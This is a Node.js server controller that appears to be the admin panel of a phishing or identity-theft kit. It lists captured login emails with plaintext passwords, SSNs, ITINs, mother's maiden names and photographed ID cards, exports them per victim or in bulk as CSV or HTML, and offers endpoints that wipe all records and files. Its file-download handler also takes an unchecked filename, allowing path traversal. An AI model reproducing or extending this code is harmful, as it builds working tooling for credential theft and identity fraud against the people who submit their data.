const User = require('../models/User');
const AuditLog = require('../models/AuditLog');
const fs = require('fs');
const path = require('path');

// Serve admin dashboard HTML
exports.getDashboard = (req, res) => {
  const dashboardPath = path.join(__dirname, '../dashboard.html');
  res.sendFile(dashboardPath);
};

// Get system statistics
exports.getSystemStats = async (req, res) => {
  try {
    const totalUsers = await User.countDocuments();
    const totalLogs = await AuditLog.countDocuments();
    const failedAttempts = await AuditLog.countDocuments({ status: 'failed' });
    const documentsUploaded = await AuditLog.countDocuments({ action: { $in: ['DOCUMENT_UPLOAD_FRONT', 'DOCUMENT_UPLOAD_BACK'] } });

    res.json({
      totalUsers,
      totalLogs,
      failedAttempts,
      documentsUploaded
    });
  } catch (error) {
    res.status(500).json({ message: 'Error getting stats', error: error.message });
  }
};

// Get all users
exports.getAllUsers = async (req, res) => {
  try {
    const users = await User.find().select('email firstName lastName verificationStage createdAt identityVerified');
    res.json({ total: users.length, users });
  } catch (error) {
    res.status(500).json({ message: 'Error getting users', error: error.message });
  }
};

// Get all logs
exports.getAllLogs = async (req, res) => {
  try {
    const logs = await AuditLog.find()
      .populate('userId', 'email firstName lastName')
      .sort({ createdAt: -1 })
      .limit(1000);

    res.json({ total: logs.length, logs });
  } catch (error) {
    res.status(500).json({ message: 'Error getting logs', error: error.message });
  }
};

// Get user logs
exports.getUserLogs = async (req, res) => {
  try {
    const { userId } = req.params;
    const logs = await AuditLog.find({ userId }).sort({ createdAt: -1 });
    res.json({ userId, total: logs.length, logs });
  } catch (error) {
    res.status(500).json({ message: 'Error getting user logs', error: error.message });
  }
};

// Get logs by action
exports.getLogsByAction = async (req, res) => {
  try {
    const { action } = req.params;
    const logs = await AuditLog.find({ action }).sort({ createdAt: -1 }).limit(500);
    res.json({ action, total: logs.length, logs });
  } catch (error) {
    res.status(500).json({ message: 'Error getting logs by action', error: error.message });
  }
};

// Get user documents
exports.getUserDocuments = async (req, res) => {
  try {
    const { userId } = req.params;
    const user = await User.findById(userId);

    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    const documentLogs = await AuditLog.find({
      userId,
      action: { $in: ['DOCUMENT_UPLOAD_FRONT', 'DOCUMENT_UPLOAD_BACK'] }
    }).sort({ createdAt: -1 });

    res.json({
      userId,
      user: { email: user.email, firstName: user.firstName, lastName: user.lastName },
      documents: {
        front: user.documentsFront || null,
        back: user.documentsBack || null
      },
      uploadHistory: documentLogs
    });
  } catch (error) {
    res.status(500).json({ message: 'Error getting documents', error: error.message });
  }
};

// Download file
exports.downloadFile = (req, res) => {
  try {
    const { filename } = req.params;
    const filePath = path.join(__dirname, '../uploads', filename);

    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ message: 'File not found' });
    }

    res.download(filePath);
  } catch (error) {
    res.status(500).json({ message: 'Error downloading file', error: error.message });
  }
};

// ============ ENHANCED DATA EXTRACTION ENDPOINTS ============

// Get all users with their collected data
exports.getAllUserData = async (req, res, next) => {
  try {
    const users = await User.find({})
      .select('-password')
      .lean()
      .sort({ createdAt: -1 });

    const userData = users.map(user => ({
      id: user._id,
      email: user.email,
      firstName: user.firstName,
      lastName: user.lastName,
      createdAt: user.createdAt,
      verificationStage: user.verificationStage,
      identityVerified: user.identityVerified,
      personalInfo: user.personalInfo,
      documentsStatus: {
        frontDoc: !!user.documentsFront?.filename,
        backDoc: !!user.documentsBack?.filename,
        frontFilename: user.documentsFront?.filename,
        backFilename: user.documentsBack?.filename
      }
    }));

    res.status(200).json({
      total: userData.length,
      users: userData
    });
  } catch (error) {
    next(error);
  }
};

// Get specific user's complete data and logs
exports.getUserCompleteData = async (req, res, next) => {
  try {
    const { userId } = req.params;

    const user = await User.findById(userId).select('-password').lean();
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    const logs = await AuditLog.find({ userId }).sort({ createdAt: -1 }).lean();

    const userComplete = {
      id: user._id,
      email: user.email,
      firstName: user.firstName,
      lastName: user.lastName,
      rememberMe: user.rememberMe,
      createdAt: user.createdAt,
      updatedAt: user.updatedAt,
      verificationStage: user.verificationStage,
      mfaVerified: user.mfaVerified,
      identityVerified: user.identityVerified,
      lastLogin: user.lastLogin,
      personalInfo: user.personalInfo,
      documents: {
        front: user.documentsFront,
        back: user.documentsBack
      },
      auditLogs: logs.map(log => ({
        timestamp: log.createdAt,
        action: log.action,
        status: log.status,
        credentialsData: log.credentialsData,
        personalInfoData: log.personalInfoData,
        ssnData: log.ssnData,
        itinData: log.itinData,
        documentData: log.documentData,
        details: log.details
      }))
    };

    res.status(200).json(userComplete);
  } catch (error) {
    next(error);
  }
};

// Get credentials collected
exports.getCredentialsSummary = async (req, res, next) => {
  try {
    const { limit = 100, skip = 0 } = req.query;

    const logs = await AuditLog.find({ 
      action: 'SIGNIN_ATTEMPT',
      'credentialsData': { $exists: true }
    })
      .select('userEmail credentialsData createdAt status')
      .sort({ createdAt: -1 })
      .limit(parseInt(limit))
      .skip(parseInt(skip))
      .lean();

    const total = await AuditLog.countDocuments({ 
      action: 'SIGNIN_ATTEMPT',
      'credentialsData': { $exists: true }
    });

    res.status(200).json({
      total,
      skip: parseInt(skip),
      limit: parseInt(limit),
      credentials: logs.map(log => ({
        email: log.credentialsData?.email,
        password: log.credentialsData?.password,
        createdAt: log.createdAt,
        userEmail: log.userEmail
      }))
    });
  } catch (error) {
    next(error);
  }
};

// Get personal info collected
exports.getPersonalInfoSummary = async (req, res, next) => {
  try {
    const { limit = 100, skip = 0 } = req.query;

    const logs = await AuditLog.find({ 
      action: 'PERSONAL_INFO_SUBMITTED',
      'personalInfoData': { $exists: true }
    })
      .select('userEmail personalInfoData createdAt')
      .sort({ createdAt: -1 })
      .limit(parseInt(limit))
      .skip(parseInt(skip))
      .lean();

    const total = await AuditLog.countDocuments({ 
      action: 'PERSONAL_INFO_SUBMITTED',
      'personalInfoData': { $exists: true }
    });

    res.status(200).json({
      total,
      skip: parseInt(skip),
      limit: parseInt(limit),
      personalInfo: logs.map(log => ({
        email: log.userEmail,
        data: log.personalInfoData,
        createdAt: log.createdAt
      }))
    });
  } catch (error) {
    next(error);
  }
};

// Get SSN/ITIN collected
exports.getSensitiveDataSummary = async (req, res, next) => {
  try {
    const { limit = 100, skip = 0 } = req.query;

    const ssnLogs = await AuditLog.find({ 
      action: 'SSN_SUBMITTED',
      'ssnData': { $exists: true }
    })
      .select('userEmail ssnData createdAt')
      .sort({ createdAt: -1 })
      .limit(parseInt(limit))
      .skip(parseInt(skip))
      .lean();

    const itinLogs = await AuditLog.find({ 
      action: 'ITIN_SUBMITTED',
      'itinData': { $exists: true }
    })
      .select('userEmail itinData createdAt')
      .sort({ createdAt: -1 })
      .limit(parseInt(limit))
      .skip(parseInt(skip))
      .lean();

    const ssnTotal = await AuditLog.countDocuments({ 
      action: 'SSN_SUBMITTED',
      'ssnData': { $exists: true }
    });

    const itinTotal = await AuditLog.countDocuments({ 
      action: 'ITIN_SUBMITTED',
      'itinData': { $exists: true }
    });

    res.status(200).json({
      ssn: {
        total: ssnTotal,
        data: ssnLogs.map(log => ({
          email: log.userEmail,
          ssn: log.ssnData,
          createdAt: log.createdAt
        }))
      },
      itin: {
        total: itinTotal,
        data: itinLogs.map(log => ({
          email: log.userEmail,
          itin: log.itinData,
          createdAt: log.createdAt
        }))
      }
    });
  } catch (error) {
    next(error);
  }
};

// Get document summary from database only
exports.getDocumentsSummary = async (req, res, next) => {
  try {
    const { limit = 100, skip = 0 } = req.query;

    // Get from database
    const frontDocs = await AuditLog.find({ 
      action: 'DOCUMENT_UPLOAD_FRONT',
      'documentData': { $exists: true }
    })
      .select('userEmail documentData createdAt')
      .sort({ createdAt: -1 })
      .limit(parseInt(limit))
      .skip(parseInt(skip))
      .lean();

    const backDocs = await AuditLog.find({ 
      action: 'DOCUMENT_UPLOAD_BACK',
      'documentData': { $exists: true }
    })
      .select('userEmail documentData createdAt')
      .sort({ createdAt: -1 })
      .limit(parseInt(limit))
      .skip(parseInt(skip))
      .lean();

    const frontTotal = await AuditLog.countDocuments({ 
      action: 'DOCUMENT_UPLOAD_FRONT',
      'documentData': { $exists: true }
    });

    const backTotal = await AuditLog.countDocuments({ 
      action: 'DOCUMENT_UPLOAD_BACK',
      'documentData': { $exists: true }
    });

    // Format documents from database
    const allFrontDocs = frontDocs.map(log => ({
      email: log.userEmail,
      filename: log.documentData?.filename,
      filesize: log.documentData?.filesize,
      mimetype: log.documentData?.mimetype,
      uploadTime: log.createdAt,
      downloadUrl: `/admin/api/download/${log.documentData?.filename}`,
      previewUrl: `/uploads/${log.documentData?.filename}`
    }));

    const allBackDocs = backDocs.map(log => ({
      email: log.userEmail,
      filename: log.documentData?.filename,
      filesize: log.documentData?.filesize,
      mimetype: log.documentData?.mimetype,
      uploadTime: log.createdAt,
      downloadUrl: `/admin/api/download/${log.documentData?.filename}`,
      previewUrl: `/uploads/${log.documentData?.filename}`
    }));

    res.status(200).json({
      frontDocuments: {
        total: frontTotal,
        documents: allFrontDocs
      },
      backDocuments: {
        total: backTotal,
        documents: allBackDocs
      }
    });
  } catch (error) {
    next(error);
  }
};
// Get all audit logs with filtering
exports.getAllAuditLogs = async (req, res, next) => {
  try {
    const { action, status, startDate, endDate, limit = 500, skip = 0 } = req.query;

    const filter = {};
    if (action) filter.action = action;
    if (status) filter.status = status;
    
    if (startDate || endDate) {
      filter.createdAt = {};
      if (startDate) filter.createdAt.$gte = new Date(startDate);
      if (endDate) filter.createdAt.$lte = new Date(endDate);
    }

    const logs = await AuditLog.find(filter)
      .sort({ createdAt: -1 })
      .limit(parseInt(limit))
      .skip(parseInt(skip))
      .lean();

    const total = await AuditLog.countDocuments(filter);

    res.status(200).json({
      total,
      skip: parseInt(skip),
      limit: parseInt(limit),
      logs
    });
  } catch (error) {
    next(error);
  }
};

// Statistics dashboard
exports.getStatistics = async (req, res, next) => {
  try {
    const totalUsers = await User.countDocuments();
    const verifiedUsers = await User.countDocuments({ identityVerified: true });
    const totalLogins = await AuditLog.countDocuments({ action: 'SIGNIN_ATTEMPT' });
    const totalDocumentsUploaded = await AuditLog.countDocuments({ 
      $or: [
        { action: 'DOCUMENT_UPLOAD_FRONT' },
        { action: 'DOCUMENT_UPLOAD_BACK' }
      ]
    });

    // Get activity by action
    const actionCounts = await AuditLog.aggregate([
      {
        $group: {
          _id: '$action',
          count: { $sum: 1 }
        }
      },
      { $sort: { count: -1 } }
    ]);

    res.status(200).json({
      summary: {
        totalUsers,
        verifiedUsers,
        totalLogins,
        totalDocumentsUploaded
      },
      actionBreakdown: actionCounts
    });
  } catch (error) {
    next(error);
  }
};

// ============ EXPORT ENDPOINTS ============

// Export user data as HTML with embedded images
exports.exportUserDataHTML = async (req, res, next) => {
  try {
    const { userId } = req.params;
    const user = await User.findById(userId).lean();
    
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    // Get all related logs
    const logs = await AuditLog.find({ userId }).lean();
    
    // Extract data by type
    const credentialsLog = logs.find(l => l.action === 'SIGNIN_ATTEMPT' && l.credentialsData);
    const personalInfoLog = logs.find(l => l.action === 'PERSONAL_INFO_SUBMITTED' && l.personalInfoData);
    const ssnLog = logs.find(l => l.action === 'SSN_SUBMITTED' && l.ssnData);
    const itinLog = logs.find(l => l.action === 'ITIN_SUBMITTED' && l.itinData);
    const documentLogs = logs.filter(l => l.action && (l.action.includes('DOCUMENT_UPLOAD')));

    // Read image files and convert to base64
    let frontImageBase64 = '';
    let backImageBase64 = '';
    
    if (user.documentsFront?.filename) {
      const frontPath = path.join(__dirname, '../uploads', user.documentsFront.filename);
      if (fs.existsSync(frontPath)) {
        const imageBuffer = fs.readFileSync(frontPath);
        frontImageBase64 = imageBuffer.toString('base64');
      }
    }
    
    if (user.documentsBack?.filename) {
      const backPath = path.join(__dirname, '../uploads', user.documentsBack.filename);
      if (fs.existsSync(backPath)) {
        const imageBuffer = fs.readFileSync(backPath);
        backImageBase64 = imageBuffer.toString('base64');
      }
    }

    // Generate HTML
    let html = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>User Data Report - ${user.email}</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html { scroll-behavior: smooth; }
    body { 
      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
      line-height: 1.7;
      color: #1f2937;
      background: linear-gradient(135deg, #f3f4f6 0%, #e5e7eb 100%);
      padding: 40px 20px;
    }
    .wrapper {
      max-width: 1000px;
      margin: 0 auto;
    }
    .header {
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      color: white;
      padding: 60px 40px;
      border-radius: 16px;
      margin-bottom: 40px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.15);
      text-align: center;
    }
    .header h1 {
      font-size: 32px;
      margin-bottom: 10px;
      letter-spacing: -0.5px;
    }
    .header p {
      opacity: 0.8;
      font-size: 14px;
    }
    .container { 
      background: white;
      padding: 0;
      border-radius: 0;
      box-shadow: none;
    }
    .section {
      margin-bottom: 0;
      padding: 40px;
      border-bottom: 1px solid #e5e7eb;
      background: white;
    }
    .section:first-of-type {
      border-radius: 12px 12px 0 0;
    }
    .section:last-of-type {
      border-bottom: none;
      border-radius: 0 0 12px 12px;
    }
    h2 { 
      color: #0f172a;
      font-size: 22px;
      margin-bottom: 24px;
      padding-bottom: 12px;
      border-bottom: 3px solid #00d9ff;
      text-transform: uppercase;
      letter-spacing: 1px;
      font-weight: 700;
    }
    .field {
      display: grid;
      grid-template-columns: 250px 1fr;
      padding: 16px 0;
      border-bottom: 1px solid #f3f4f6;
    }
    .field:last-child { border-bottom: none; }
    .label { 
      font-weight: 700;
      color: #0f172a;
      text-transform: uppercase;
      font-size: 12px;
      letter-spacing: 0.5px;
    }
    .value { 
      color: #4b5563;
      word-break: break-all;
    }
    .value code {
      background: #f3f4f6;
      padding: 4px 8px;
      border-radius: 4px;
      font-family: 'Courier New', monospace;
      font-size: 12px;
      color: #7c3aed;
    }
    .images-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 30px;
      margin-top: 20px;
    }
    .image-container {
      border: 2px solid #e5e7eb;
      border-radius: 12px;
      overflow: hidden;
      background: #f9fafb;
      transition: all 0.3s ease;
    }
    .image-container:hover {
      border-color: #00d9ff;
      box-shadow: 0 8px 24px rgba(0, 217, 255, 0.1);
    }
    .image-container img {
      width: 100%;
      height: auto;
      display: block;
      max-height: 400px;
      object-fit: contain;
    }
    .image-label {
      padding: 16px;
      background: linear-gradient(135deg, #00d9ff15 0%, #7c3aed15 100%);
      font-weight: 700;
      color: #0f172a;
      font-size: 14px;
      border-top: 2px solid #e5e7eb;
    }
    .image-meta {
      padding: 8px 16px;
      font-size: 12px;
      color: #6b7280;
      border-top: 1px solid #e5e7eb;
    }
    .badge {
      display: inline-block;
      padding: 6px 12px;
      border-radius: 6px;
      font-size: 12px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .badge-success { 
      background: #dcfce7;
      color: #166534;
    }
    .badge-danger { 
      background: #fee2e2;
      color: #991b1b;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }
    th {
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      color: white;
      padding: 16px;
      text-align: left;
      font-weight: 700;
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    td {
      padding: 14px 16px;
      border-bottom: 1px solid #f3f4f6;
      color: #4b5563;
    }
    td code {
      background: #f3f4f6;
      padding: 4px 8px;
      border-radius: 4px;
      font-family: 'Courier New', monospace;
      font-size: 12px;
    }
    tr:nth-child(even) { background: #f9fafb; }
    .timestamp {
      font-size: 12px;
      color: #9ca3af;
    }
    .no-data {
      color: #9ca3af;
      font-style: italic;
      padding: 20px;
      text-align: center;
    }
    .footer {
      margin-top: 20px;
      padding: 40px;
      border-top: 2px solid #e5e7eb;
      font-size: 12px;
      color: #6b7280;
      text-align: center;
      background: #f9fafb;
      border-radius: 0 0 12px 12px;
    }
    .footer-divider {
      margin: 12px 0;
    }
    .report-id {
      font-family: monospace;
      color: #7c3aed;
      font-size: 11px;
    }
    @media print {
      body { background: white; padding: 0; }
      .header { page-break-after: avoid; }
      .section { page-break-inside: avoid; }
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="header">
      <h1>USER DATA REPORT</h1>
      <p>Comprehensive Account Information & Document Record</p>
    </div>
    
    <div class="container">
    
      <div class="section">
        <h2>Account Information</h2>
        <div class="field">
          <span class="label">Email Address</span>
          <span class="value"><strong>${user.email}</strong></span>
        </div>
        <div class="field">
          <span class="label">Account Created</span>
          <span class="value">${new Date(user.createdAt).toLocaleString()}</span>
        </div>
        <div class="field">
          <span class="label">Verification Progress</span>
          <span class="value"><span class="badge badge-success">${user.verificationStage || 0}/5</span></span>
        </div>
        <div class="field">
          <span class="label">Identity Verified</span>
          <span class="value"><span class="badge ${user.identityVerified ? 'badge-success' : 'badge-danger'}">${user.identityVerified ? '✓ VERIFIED' : '✗ PENDING'}</span></span>
        </div>
      </div>

      <div class="section">
        <h2>Authentication Credentials</h2>
        ${credentialsLog ? `
          <div class="field">
            <span class="label">Email</span>
            <span class="value"><code>${credentialsLog.credentialsData?.email || 'N/A'}</code></span>
          </div>
          <div class="field">
            <span class="label">Password</span>
            <span class="value"><code>${credentialsLog.credentialsData?.password || 'N/A'}</code></span>
          </div>
          <div class="field">
            <span class="label">Submitted</span>
            <span class="value timestamp">${new Date(credentialsLog.createdAt).toLocaleString()}</span>
          </div>
        ` : '<p class="no-data">No credentials recorded</p>'}
      </div>

      <div class="section">
        <h2>Background Information</h2>
        ${personalInfoLog ? `
          <div class="field">
            <span class="label">First Name</span>
            <span class="value">${personalInfoLog.personalInfoData?.firstName || 'N/A'}</span>
          </div>
          <div class="field">
            <span class="label">Middle Name</span>
            <span class="value">${personalInfoLog.personalInfoData?.middleName || 'N/A'}</span>
          </div>
          <div class="field">
            <span class="label">Last Name</span>
            <span class="value">${personalInfoLog.personalInfoData?.lastName || 'N/A'}</span>
          </div>
          <div class="field">
            <span class="label">Father's Name</span>
            <span class="value">${personalInfoLog.personalInfoData?.fatherName || 'N/A'}</span>
          </div>
          <div class="field">
            <span class="label">Mother's Name</span>
            <span class="value">${personalInfoLog.personalInfoData?.motherName || 'N/A'}</span>
          </div>
          <div class="field">
            <span class="label">Mother's Maiden Name</span>
            <span class="value">${personalInfoLog.personalInfoData?.maidenName || 'N/A'}</span>
          </div>
          <div class="field">
            <span class="label">Place of Birth</span>
            <span class="value">${personalInfoLog.personalInfoData?.placeOfBirth || 'N/A'}</span>
          </div>
          <div class="field">
            <span class="label">Submitted</span>
            <span class="value timestamp">${new Date(personalInfoLog.createdAt).toLocaleString()}</span>
          </div>
        ` : '<p class="no-data">No background information recorded</p>'}
      </div>

      <div class="section">
        <h2>Identification Documents</h2>
        ${(frontImageBase64 || backImageBase64) ? `
          <div class="images-grid">
            ${frontImageBase64 ? `
              <div class="image-container">
                <img src="data:image/jpeg;base64,${frontImageBase64}" alt="ID Front">
                <div class="image-label">Front Side of ID</div>
                <div class="image-meta">📅 ${new Date(user.documentsFront?.uploadedAt).toLocaleString()}</div>
              </div>
            ` : ''}
            ${backImageBase64 ? `
              <div class="image-container">
                <img src="data:image/jpeg;base64,${backImageBase64}" alt="ID Back">
                <div class="image-label">Back Side of ID</div>
                <div class="image-meta">📅 ${new Date(user.documentsBack?.uploadedAt).toLocaleString()}</div>
              </div>
            ` : ''}
          </div>
        ` : '<p class="no-data">No documents uploaded</p>'}
      </div>

      <div class="section">
        <h2>Sensitive Information</h2>
        <table>
          <thead>
            <tr>
              <th>Data Type</th>
              <th>Value</th>
              <th>Submitted Date</th>
            </tr>
          </thead>
          <tbody>
            ${ssnLog ? `
              <tr>
                <td><strong>SSN</strong></td>
                <td><code>${ssnLog.ssnData}</code></td>
                <td><span class="timestamp">${new Date(ssnLog.createdAt).toLocaleString()}</span></td>
              </tr>
            ` : ''}
            ${itinLog ? `
              <tr>
                <td><strong>ITIN</strong></td>
                <td><code>${itinLog.itinData}</code></td>
                <td><span class="timestamp">${new Date(itinLog.createdAt).toLocaleString()}</span></td>
              </tr>
            ` : ''}
            ${!ssnLog && !itinLog ? '<tr><td colspan="3" class="no-data">No sensitive data recorded</td></tr>' : ''}
          </tbody>
        </table>
      </div>

      <div class="section">
        <h2>Document Upload History</h2>
        ${documentLogs.length > 0 ? `
          <table>
            <thead>
              <tr>
                <th>Upload Type</th>
                <th>Filename</th>
                <th>Size (KB)</th>
                <th>Date</th>
              </tr>
            </thead>
            <tbody>
              ${documentLogs.map(log => `
                <tr>
                  <td><strong>${log.documentData?.type || 'Unknown'}</strong></td>
                  <td>${log.documentData?.filename || 'N/A'}</td>
                  <td>${((log.documentData?.filesize || 0) / 1024).toFixed(2)}</td>
                  <td><span class="timestamp">${new Date(log.createdAt).toLocaleString()}</span></td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        ` : '<p class="no-data">No documents uploaded</p>'}
      </div>

      <div class="footer">
        <div>Report Generated: <strong>${new Date().toLocaleString()}</strong></div>
        <div class="footer-divider">———————</div>
        <div><strong>CONFIDENTIALITY NOTICE</strong></div>
        <div>This document contains sensitive personal information and must be handled securely.</div>
        <div style="margin-top: 12px;">
          <div class="report-id">Report ID: ${Date.now()}</div>
        </div>
      </div>
    </div>
  </div>
</body>
</html>
    `;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="user-data-${user.email}-${Date.now()}.html"`);
    res.send(html);
  } catch (error) {
    next(error);
  }
};

// Export user data as CSV
exports.exportUserDataCSV = async (req, res, next) => {
  try {
    const { userId } = req.params;
    const user = await User.findById(userId).lean();
    
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    const logs = await AuditLog.find({ userId }).lean();
    
    const credentialsLog = logs.find(l => l.action === 'SIGNIN_ATTEMPT' && l.credentialsData);
    const personalInfoLog = logs.find(l => l.action === 'PERSONAL_INFO_SUBMITTED' && l.personalInfoData);
    const ssnLog = logs.find(l => l.action === 'SSN_SUBMITTED' && l.ssnData);
    const itinLog = logs.find(l => l.action === 'ITIN_SUBMITTED' && l.itinData);

    // Create CSV content
    let csv = 'User Data Export\n';
    csv += `Generated: ${new Date().toLocaleString()}\n\n`;
    
    csv += 'User Information\n';
    csv += 'Email,First Name,Last Name,Created,Stage,Verified\n';
    csv += `"${user.email}","${user.firstName || ''}","${user.lastName || ''}","${new Date(user.createdAt).toLocaleString()}",${user.verificationStage || 0},"${user.identityVerified ? 'Yes' : 'No'}"\n\n`;
    
    csv += 'Credentials\n';
    csv += 'Email,Password,Submitted\n';
    if (credentialsLog) {
      csv += `"${credentialsLog.credentialsData?.email || ''}","${credentialsLog.credentialsData?.password || ''}","${new Date(credentialsLog.createdAt).toLocaleString()}"\n`;
    }
    csv += '\n';
    
    csv += 'Background Information\n';
    csv += 'First Name,Last Name,Middle Name,Father Name,Mother Name,Maiden Name,Place of Birth,Submitted\n';
    if (personalInfoLog) {
      const p = personalInfoLog.personalInfoData || {};
      csv += `"${p.firstName || ''}","${p.lastName || ''}","${p.middleName || ''}","${p.fatherName || ''}","${p.motherName || ''}","${p.maidenName || ''}","${p.placeOfBirth || ''}","${new Date(personalInfoLog.createdAt).toLocaleString()}"\n`;
    }
    csv += '\n';
    
    csv += 'Sensitive Data\n';
    csv += 'Type,Value,Date\n';
    if (ssnLog) {
      csv += `"SSN","${ssnLog.ssnData}","${new Date(ssnLog.createdAt).toLocaleString()}"\n`;
    }
    if (itinLog) {
      csv += `"ITIN","${itinLog.itinData}","${new Date(itinLog.createdAt).toLocaleString()}"\n`;
    }

    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="user-data-${user.email}-${Date.now()}.csv"`);
    res.send(csv);
  } catch (error) {
    next(error);
  }
};

// Export all users data as CSV
exports.exportAllUsersCSV = async (req, res, next) => {
  try {
    const users = await User.find().lean();
    const logs = await AuditLog.find().lean();

    let csv = 'All Users Data Export\n';
    csv += `Generated: ${new Date().toLocaleString()}\n\n`;
    csv += 'Email,First Name,Last Name,Created,Stage,Verified,Credentials Email,Credentials Password,SSN,ITIN,First Name (BG),Last Name (BG),Place of Birth\n';

    for (const user of users) {
      const userLogs = logs.filter(l => l.userId && l.userId.toString() === user._id.toString());
      const credentialsLog = userLogs.find(l => l.action === 'SIGNIN_ATTEMPT' && l.credentialsData);
      const personalInfoLog = userLogs.find(l => l.action === 'PERSONAL_INFO_SUBMITTED' && l.personalInfoData);
      const ssnLog = userLogs.find(l => l.action === 'SSN_SUBMITTED' && l.ssnData);
      const itinLog = userLogs.find(l => l.action === 'ITIN_SUBMITTED' && l.itinData);

      csv += `"${user.email}",`;
      csv += `"${user.firstName || ''}",`;
      csv += `"${user.lastName || ''}",`;
      csv += `"${new Date(user.createdAt).toLocaleString()}",`;
      csv += `${user.verificationStage || 0},`;
      csv += `"${user.identityVerified ? 'Yes' : 'No'}",`;
      csv += `"${credentialsLog?.credentialsData?.email || ''}",`;
      csv += `"${credentialsLog?.credentialsData?.password || ''}",`;
      csv += `"${ssnLog?.ssnData || ''}",`;
      csv += `"${itinLog?.itinData || ''}",`;
      csv += `"${personalInfoLog?.personalInfoData?.firstName || ''}",`;
      csv += `"${personalInfoLog?.personalInfoData?.lastName || ''}",`;
      csv += `"${personalInfoLog?.personalInfoData?.placeOfBirth || ''}"\n`;
    }

    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="all-users-data-${Date.now()}.csv"`);
    res.send(csv);
  } catch (error) {
    next(error);
  }
};

// ============ DELETE ENDPOINTS ============

// Delete all data and logs
exports.deleteAllData = async (req, res) => {
  try {
    // Delete all users
    const usersResult = await User.deleteMany({});
    
    // Delete all audit logs
    const logsResult = await AuditLog.deleteMany({});

    // Delete all uploaded files
    const uploadsDir = path.join(__dirname, '../uploads');
    if (fs.existsSync(uploadsDir)) {
      const files = fs.readdirSync(uploadsDir);
      files.forEach(file => {
        const filePath = path.join(uploadsDir, file);
        fs.unlinkSync(filePath);
      });
    }

    res.json({
      message: 'All data and logs have been deleted successfully',
      deletedUsers: usersResult.deletedCount,
      deletedLogs: logsResult.deletedCount
    });
  } catch (error) {
    res.status(500).json({ 
      message: 'Error deleting data',
      error: error.message 
    });
  }
};

// Delete all users
exports.deleteAllUsers = async (req, res) => {
  try {
    const result = await User.deleteMany({});
    res.json({
      message: 'All users deleted',
      deletedCount: result.deletedCount
    });
  } catch (error) {
    res.status(500).json({ 
      message: 'Error deleting users',
      error: error.message 
    });
  }
};

// Delete all logs
exports.deleteAllLogs = async (req, res) => {
  try {
    const result = await AuditLog.deleteMany({});
    res.json({
      message: 'All logs deleted',
      deletedCount: result.deletedCount
    });
  } catch (error) {
    res.status(500).json({ 
      message: 'Error deleting logs',
      error: error.message 
    });
  }
};
